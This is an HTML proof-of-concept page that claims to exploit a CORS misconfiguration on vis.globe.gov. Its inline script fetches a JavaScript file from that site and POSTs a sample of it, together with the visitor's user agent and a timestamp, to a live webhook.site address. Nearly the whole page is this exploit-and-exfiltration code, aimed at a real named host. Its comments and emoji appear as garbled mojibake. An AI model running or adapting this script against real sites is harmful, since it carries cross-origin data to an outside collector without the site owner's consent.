<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>GLOBE.gov CORS Vulnerability PoC</title>
</head>
<body>
<h2>ğŸ” Testing vis.globe.gov CORS Misconfiguration</h2>
<pre id="output">Initializing...</pre>

<script>
const webhook = "https://webhook.site/29f5b779-2540-4657-a365-bc504ee5c1de"; // â† ØºÙŠÙ‘Ø±Ù‡ Ø¥Ø°Ø§ Ø£Ø±Ø¯Øª

function log(msg) {
  document.getElementById("output").textContent += "\n" + msg;
  console.log(msg);
}

(async () => {
  try {
    log("ğŸ“¡ Fetching JS file from vis.globe.gov...");
    const response = await fetch("https://vis.globe.gov/GLOBE/javascript/VISmain.js");
    log("âœ… Response Status: " + response.status);

    const content = await response.text();
    const payload = {
      message: "CORS Misconfig Exploit Successful",
      source: "https://vis.globe.gov/GLOBE/javascript/VISmain.js",
      sample: content.slice(0, 500),
      userAgent: navigator.userAgent,
      timestamp: new Date().toISOString()
    };

    // Ø§Ø³ØªØ®Ø¯Ø§Ù… XMLHttpRequest Ø¨Ø¯Ù„ fetch Ù„Ø­Ù„ Ù…Ø´Ø§ÙƒÙ„ webhook CORS
    const xhr = new XMLHttpRequest();
    xhr.open("POST", webhook, true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.onreadystatechange = () => {
      if (xhr.readyState === XMLHttpRequest.DONE) {
        log("ğŸ“¤ Webhook POST status: " + xhr.status);
        if (xhr.status === 200) {
          log("âœ… Data sent to webhook successfully!");
        } else {
          log("âŒ Failed to send data. Check CORS/Webhook setup.");
        }
      }
    };
    xhr.send(JSON.stringify(payload));
  } catch (e) {
    log("âŒ Error: " + e.message);
  }
})();
</script>

</body>
</html>
